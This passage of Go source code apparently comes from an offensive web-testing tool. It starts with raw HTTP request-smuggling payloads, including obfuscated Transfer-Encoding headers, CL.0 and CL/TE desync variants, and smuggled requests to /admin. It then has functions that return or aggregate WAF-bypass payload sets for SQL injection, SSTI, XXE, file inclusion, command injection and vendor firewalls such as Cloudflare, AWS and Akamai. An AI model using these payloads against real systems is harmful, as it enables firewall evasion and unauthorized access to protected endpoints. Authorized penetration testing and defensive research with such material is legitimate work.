	{Raw: "GET / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n", Description: "HTTPD-TE.TE混淆", WAF: WAFGeneric},
	{Raw: "GET / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n", Description: "HTTPD-空格混淆TE", WAF: WAFGeneric},
	{Raw: "GET / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding:\x0bchunked\r\n\r\n0\r\n\r\n", Description: "HTTPD-垂直Tab混淆TE", WAF: WAFGeneric},
	{Raw: "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: keep-alive\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG", Description: "HTTPD-CL正向走私", WAF: WAFGeneric},
	{Raw: "GET / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 15\r\n\r\nx=1", Description: "HTTPD-请求队列投毒", WAF: WAFGeneric},
	{Raw: "GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n", Description: "HTTPD-CL0走私", WAF: WAFGeneric},
	{Raw: "GET / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n0\r\n\r\n", Description: "HTTPD-前后端CL/TE分歧", WAF: WAFGeneric},
	{Raw: "GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 100\r\n\r\nGET /admin HTTP/1.1\r\nX-Ignore:", Description: "HTTPD-后缀填充", WAF: WAFGeneric},
}

func WAFBypassDatabaseInfoPayloads() []Payload       { return wafBypassDatabaseInfo }
func WAFBypassInformationSchemaPayloads() []Payload   { return wafBypassInformationSchema }

func WAFBypassSSTIPayloads() []Payload               { return wafBypassSSTIInjection }
func WAFBypassXXEPayloads() []Payload                { return wafBypassXXEInjection }
func WAFBypassFileInclusionPayloads() []Payload       { return wafBypassFileInclusion }
func WAFBypassNoSQLInjectionPayloads() []Payload      { return wafBypassNoSQLInjection }
func WAFBypassHTTPDesyncPayloads() []Payload          { return wafBypassHTTPDesync }

func WAFBypassSQLKeywordsPayloads() []Payload        { return wafBypassSQLKeywords }
func WAFBypassCommentStylesPayloads() []Payload       { return wafBypassCommentStyles }
func WAFBypassSpacesPayloads() []Payload              { return wafBypassSpaces }
func WAFBypassLogicalOpPayloads() []Payload           { return wafBypassLogicalOperators }
func WAFBypassUnionVariantsPayloads() []Payload       { return wafBypassUnionVariants }
func WAFBypassOrderByVariantsPayloads() []Payload     { return wafBypassOrderByVariants }
func WAFBypassStringConcatPayloads() []Payload        { return wafBypassStringConcat }
func WAFBypassCharEncodingPayloads() []Payload        { return wafBypassCharEncoding }
func WAFBypassCaseWhenPayloads() []Payload            { return wafBypassCaseWhen }
func WAFBypassTimeBasedPayloads() []Payload           { return wafBypassTimeBased }
func WAFBypassStackedQueriesPayloads() []Payload       { return wafBypassStackedQueries }
func WAFBypassHTTPPollutionPayloads() []Payload       { return wafBypassHTTPParamPollution }
func WAFBypassHTTPBodyPayloads() []Payload            { return wafBypassHTTPBodyVariants }
func WAFBypassErrorBasedPayloads() []Payload          { return wafBypassErrorBased }
func WAFBypassBlindSQLPayloads() []Payload            { return wafBypassBlindSQL }
func WAFBypassXPathPayloads() []Payload               { return wafBypassXPath }
func WAFBypassLDAPPayloads() []Payload                { return wafBypassLDAP }
func WAFBypassCmdInjectionPayloads() []Payload        { return wafBypassCmdInjection }
func WAFBypassUNIONCrossDBPayloads() []Payload        { return wafBypassUNIONCrossDB }
func WAFBypassCOMMENTInjectionPayloads() []Payload    { return wafBypassCOMMENTInjection }
func WAFBypassFUNCTIONHidingPayloads() []Payload      { return wafBypassFUNCTIONHiding }
func WAFBypassMATHOperationsPayloads() []Payload      { return wafBypassMATHOperations }

func WAFBypassPayloads(waf WAFType) []Payload {
	switch waf {
	case WAFCloudflare:
		return wafBypassCloudflare
	case WAFAWS:
		return wafBypassAWS
	case WAFModSecurity:
		return wafBypassModSecurity
	case WAFIncapsula:
		return wafBypassIncapsula
	case WAFF5:
		return wafBypassF5
	case WAFBarracuda:
		return wafBypassBarracuda
	case WAFSucuri:
		return wafBypassSucuri
	case WAFAkamai:
		return wafBypassAkamai
	case WAFGeneric:
		return wafBypassGeneric
	default:
		return wafBypassGeneric
	}
}

func WAFBypassHPPPayloads() []Payload              { return wafBypassHPP }
func WAFBypassContentTypePayloads() []Payload       { return wafBypassContentType }
func WAFBypassChunkedPayloads() []Payload           { return wafBypassChunkedTransfer }
func WAFBypassMethodManglingPayloads() []Payload     { return wafBypassMethodMangling }
func WAFBypassHostHeaderPayloads() []Payload         { return wafBypassHostHeader }
func WAFBypassPathNormPayloads() []Payload           { return wafBypassPathNormalization }
func WAFBypassWideBytePayloads() []Payload           { return wafBypassWideBytePayloads }
func WAFBypassNullBytePayloads() []Payload           { return wafBypassNullBytePayloads }
func WAFBypassBufferOverflowPayloads() []Payload     { return wafBypassBufferOverflowPayloads }
func WAFBypassEncodingChainPayloads() []Payload      { return wafBypassEncodingChainPayloads }

func WAFBypassAllPayloads() []Payload {
	var all []Payload
	all = append(all, wafBypassCloudflare...)
	all = append(all, wafBypassAWS...)
	all = append(all, wafBypassModSecurity...)
	all = append(all, wafBypassIncapsula...)
	all = append(all, wafBypassF5...)
	all = append(all, wafBypassBarracuda...)
	all = append(all, wafBypassSucuri...)
	all = append(all, wafBypassAkamai...)
	all = append(all, wafBypassGeneric...)
	all = append(all, wafBypassHPP...)
	all = append(all, wafBypassContentType...)
	all = append(all, wafBypassChunkedTransfer...)
	all = append(all, wafBypassMethodMangling...)
	all = append(all, wafBypassHostHeader...)
	all = append(all, wafBypassPathNormalization...)
	all = append(all, wafBypassWideBytePayloads...)
	all = append(all, wafBypassNullBytePayloads...)
	all = append(all, wafBypassBufferOverflowPayloads...)
	all = append(all, wafBypassEncodingChainPayloads...)
	all = append(all, wafBypassSQLKeywords...)
	all = append(all, wafBypassCommentStyles...)
	all = append(all, wafBypassSpaces...)
	all = append(all, wafBypassLogicalOperators...)
	all = append(all, wafBypassUnionVariants...)
	all = append(all, wafBypassOrderByVariants...)
	all = append(all, wafBypassStringConcat...)
	all = append(all, wafBypassCharEncoding...)
	all = append(all, wafBypassCaseWhen...)
	all = append(all, wafBypassTimeBased...)
	all = append(all, wafBypassStackedQueries...)
	all = append(all, wafBypassHTTPParamPollution...)
	all = append(all, wafBypassHTTPBodyVariants...)
	all = append(all, wafBypassErrorBased...)
	all = append(all, wafBypassBlindSQL...)
	all = append(all, wafBypassXPath...)
	all = append(all, wafBypassLDAP...)
	all = append(all, wafBypassCmdInjection...)
	all = append(all, wafBypassUNIONCrossDB...)
	all = append(all, wafBypassCOMMENTInjection...)
	all = append(all, wafBypassFUNCTIONHiding...)
	all = append(all, wafBypassMATHOperations...)
	all = append(all, wafBypassDatabaseInfo...)
	all = append(all, wafBypassInformationSchema...)
	all = append(all, wafBypassSSTIInjection...)
	all = append(all, wafBypassXXEInjection...)
	all = append(all, wafBypassFileInclusion...)
	all = append(all, wafBypassNoSQLInjection...)
	all = append(all, wafBypassHTTPDesync...)
	return all
}